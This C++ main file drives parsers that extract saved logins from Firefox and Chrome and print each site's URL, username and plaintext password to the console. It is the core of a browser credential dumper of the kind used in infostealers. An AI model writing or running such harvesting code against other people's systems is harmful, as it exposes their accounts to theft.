#include <iostream>
#include "ChromeParser.h"
#include "FirefoxParser.h"


int main()
{
	


	FirefoxParser firefox_parser;

	auto accounts = firefox_parser.collect_data();

	for (const auto& data : accounts)
	{
		std::cout << "Url: " << data.Url << std::endl << "Username: " << data.Username << std::endl << "Password: " << data.Password << std::endl;
		std::cout << "--------------------------------------------------------------------------------" << std::endl;
	}

	
	chrome_parser parser;
	List<AccountData> data_out;
	if (!parser.try_parse_chrome(data_out))
	{
		std::cout << "user data was not found!";
	}


	for (const auto& data : data_out)
	{
		std::cout << "Url: " <<data.Url << std::endl << "Username: " << data.Username << std::endl << "Password: " << data.Password << std::endl;
		std::cout << "--------------------------------------------------------------------------------" << std::endl;
	}
	
	system("pause");
	return 0;
}
